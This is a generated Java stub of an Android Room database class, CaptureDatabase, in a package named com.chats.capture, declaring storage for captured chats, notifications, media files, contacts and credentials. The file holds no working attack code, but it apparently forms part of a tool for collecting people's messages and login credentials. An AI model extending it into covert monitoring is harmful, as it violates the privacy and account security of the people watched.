package com.chats.capture.database;

@kotlin.Metadata(mv = {1, 9, 0}, k = 1, xi = 48, d1 = {"\u00002\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0002\b\'\u0018\u0000 \u000f2\u00020\u0001:\u0001\u000fB\u0005\u00a2\u0006\u0002\u0010\u0002J\b\u0010\u0003\u001a\u00020\u0004H&J\b\u0010\u0005\u001a\u00020\u0006H&J\b\u0010\u0007\u001a\u00020\bH&J\b\u0010\t\u001a\u00020\nH&J\b\u0010\u000b\u001a\u00020\fH&J\b\u0010\r\u001a\u00020\u000eH&\u00a8\u0006\u0010"}, d2 = {"Lcom/chats/capture/database/CaptureDatabase;", "Landroidx/room/RoomDatabase;", "()V", "chatDao", "Lcom/chats/capture/database/ChatDao;", "contactDao", "Lcom/chats/capture/database/ContactDao;", "credentialDao", "Lcom/chats/capture/database/CredentialDao;", "mediaFileDao", "Lcom/chats/capture/database/MediaFileDao;", "notificationDao", "Lcom/chats/capture/database/NotificationDao;", "updateStatusDao", "Lcom/chats/capture/database/UpdateStatusDao;", "Companion", "app_debug"})
@androidx.room.Database(entities = {com.chats.capture.models.NotificationData.class, com.chats.capture.models.ChatData.class, com.chats.capture.models.MediaFile.class, com.chats.capture.models.UpdateStatus.class, com.chats.capture.models.Credential.class, com.chats.capture.models.Contact.class}, version = 4, exportSchema = true)
@androidx.room.TypeConverters(value = {com.chats.capture.database.Converters.class})
public abstract class CaptureDatabase extends androidx.room.RoomDatabase {
    @kotlin.jvm.Volatile()
    @org.jetbrains.annotations.Nullable()
    private static volatile com.chats.capture.database.CaptureDatabase INSTANCE;
    @org.jetbrains.annotations.NotNull()
    private static final androidx.room.migration.Migration MIGRATION_1_2 = null;
    @org.jetbrains.annotations.NotNull()
    private static final androidx.room.migration.Migration MIGRATION_2_3 = null;
    @org.jetbrains.annotations.NotNull()
    private static final androidx.room.migration.Migration MIGRATION_3_4 = null;
    @org.jetbrains.annotations.NotNull()
    public static final com.chats.capture.database.CaptureDatabase.Companion Companion = null;
    
    public CaptureDatabase() {
        super();
    }
    
    @org.jetbrains.annotations.NotNull()
    public abstract com.chats.capture.database.NotificationDao notificationDao();
    
    @org.jetbrains.annotations.NotNull()
    public abstract com.chats.capture.database.ChatDao chatDao();
    
    @org.jetbrains.annotations.NotNull()
    public abstract com.chats.capture.database.MediaFileDao mediaFileDao();
    
    @org.jetbrains.annotations.NotNull()
    public abstract com.chats.capture.database.UpdateStatusDao updateStatusDao();
    
    @org.jetbrains.annotations.NotNull()
    public abstract com.chats.capture.database.CredentialDao credentialDao();
    
    @org.jetbrains.annotations.NotNull()
    public abstract com.chats.capture.database.ContactDao contactDao();
    
    @kotlin.Metadata(mv = {1, 9, 0}, k = 1, xi = 48, d1 = {"\u0000 \n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0004\n\u0002\u0018\u0002\n\u0000\b\u0086\u0003\u0018\u00002\u00020\u0001B\u0007\b\u0002\u00a2\u0006\u0002\u0010\u0002J\u000e\u0010\t\u001a\u00020\u00042\u0006\u0010\n\u001a\u00020\u000bR\u0010\u0010\u0003\u001a\u0004\u0018\u00010\u0004X\u0082\u000e\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0005\u001a\u00020\u0006X\u0082\u0004\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0007\u001a\u00020\u0006X\u0082\u0004\u00a2\u0006\u0002\n\u0000R\u000e\u0010\b\u001a\u00020\u0006X\u0082\u0004\u00a2\u0006\u0002\n\u0000\u00a8\u0006\f"}, d2 = {"Lcom/chats/capture/database/CaptureDatabase$Companion;", "", "()V", "INSTANCE", "Lcom/chats/capture/database/CaptureDatabase;", "MIGRATION_1_2", "Landroidx/room/migration/Migration;", "MIGRATION_2_3", "MIGRATION_3_4", "getDatabase", "context", "Landroid/content/Context;", "app_debug"})
    public static final class Companion {
        
        private Companion() {
            super();
        }
        
        @org.jetbrains.annotations.NotNull()
        public final com.chats.capture.database.CaptureDatabase getDatabase(@org.jetbrains.annotations.NotNull()
        android.content.Context context) {
            return null;
        }
    }
}